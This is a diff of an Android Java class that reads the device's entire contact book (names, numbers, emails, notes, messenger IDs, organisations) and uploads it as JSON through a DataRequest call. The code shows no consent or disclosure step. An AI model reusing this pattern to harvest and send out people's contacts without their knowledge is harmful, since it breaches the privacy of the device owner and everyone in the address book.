@@ -6,15 +6,14 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import com.inet.android.request.DataRequest;
-import com.inet.android.utils.Logging;
-
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.provider.ContactsContract;
-import android.util.Log;
+
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
 
 public class GetContacts extends AsyncTask<Context, Void, Void> {
 	Context mContext;
@@ -32,12 +31,15 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 	private JSONObject jsonImId;
 	private JSONObject jsonImCount;
 	private JSONObject jsonOrganization;
-	private JSONObject jsonContact;
-	private JSONArray jsonAllContact;
+	private JSONObject jsonObject;
+	private JSONArray data = new JSONArray();
+	private JSONObject jsonAllContact;
 	private String LOG_TAG = "GetContacts";
+	private String sendJSONStr;
 
 	public void readContacts() throws JSONException {
-		jsonAllContact = new JSONArray();
+		data = new JSONArray();
+		jsonAllContact = new JSONObject();
 		ContentResolver cr = mContext.getContentResolver();
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
@@ -54,7 +56,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonImId = new JSONObject();
 				jsonImCount = new JSONObject();
 				jsonOrganization = new JSONObject();
-				jsonContact = new JSONObject();
+				jsonObject = new JSONObject();
 
 				email = new ArrayList<String>();
 				emailType = new ArrayList<String>();
@@ -70,7 +72,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						.parseInt(cur.getString(cur
 								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
 					// Log.d("GetContacts", "name : " + name + ", ID : " + id);
-					// jsonName.put("name", name);
+					jsonName.put("name", name);
 					// ----------------------------------------------------------------------------------------------------------------------------------
 					// get the phone number
 					Cursor pCur = cr.query(
@@ -85,11 +87,11 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						String phoneType = getTipe(pCur
 								.getInt(pCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
-						// phone.add(mPhone);
 						jsonPhoneType.put(mPhone, phoneType);
 					}
 
 					pCur.close();
+					// ------------------------------------------------------------------------------------------
 					// get email and type
 					// -----------------------------------------------------------------------------------------------------------------------------------------
 					Cursor emailCur = cr.query(
@@ -116,8 +118,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						if (sEmail != null)
 							jsonEmailCount.put(sEmail, cCustomemailType);
 					}
-					emailCur.close();
 					jsonEmailId.put("email", jsonEmailCount);
+					emailCur.close();
 					// --------------------------------------------------------------------------------------------------------------------------------------------------
 
 					// Get note.......
@@ -140,7 +142,6 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 					}
 					noteCur.close();
 
-					
 					// ----------------------------------------------------------------------------------------------------------------------------------------------------
 					// Get Instant Messenger.........
 					String imWhere = ContactsContract.Data.CONTACT_ID
@@ -183,14 +184,16 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						String title = orgCur
 								.getString(orgCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
-						
+
 						if (orgName != null || title != null)
 							jsonOrganization.put("org", orgName + " " + title);
 					}
 					orgCur.close();
 
 				}
-				jsonContact.put("type", type);
+//				JSONObject object = new JSONObject();
+
+				jsonObject.put("type", type);
 				if (!jsonName.isNull("name"))
 					jsonInfo.put("name", jsonName);
 				jsonInfo.put("number", jsonPhoneType);
@@ -199,39 +202,20 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonInfo.put("note", jsonNote);
 				jsonInfo.put("im", jsonImId);
 				jsonInfo.put("org", jsonOrganization);
-				jsonContact.put("info", jsonInfo);
-				jsonAllContact.put(jsonContact);
-				Logging.doLog(LOG_TAG, jsonContact.toString());
-
+				jsonObject.put("info", jsonInfo);
+				data.put(jsonObject);
+				jsonAllContact.put("data", data);
+				sendJSONStr = data.toString();
 			}
-			Logging.doLog(LOG_TAG, jsonAllContact.toString());
-
-			Logging.doLog(LOG_TAG, Integer.toString(jsonAllContact.length()));
 			if (jsonAllContact != null) {
 				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(jsonAllContact.toString());
-				Logging.doLog(LOG_TAG, jsonAllContact.toString());
+				dr.sendRequest(sendJSONStr);
+				Logging.doLog(LOG_TAG, sendJSONStr,
+						sendJSONStr);
 			}
 		}
 	}
 
-	private String getTipeAddress(int typeAddres) {
-		// TODO Auto-generated method stub
-		String sType = "";
-		int addressType = typeAddres;
-		switch (addressType) {
-		case 1:
-			sType = "Home";
-			break;
-		case 2:
-			sType = "Work";
-			break;
-		case 3:
-			sType = "Other";
-			break;
-		}
-		return sType;
-	}
 
 	private String getTipe(int phonetype) {
 		String sType = "";
